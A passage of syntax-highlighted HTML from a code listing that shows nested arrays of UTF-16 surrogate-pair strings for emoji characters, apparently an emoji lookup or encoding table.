class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de03&quot;</span>, <span 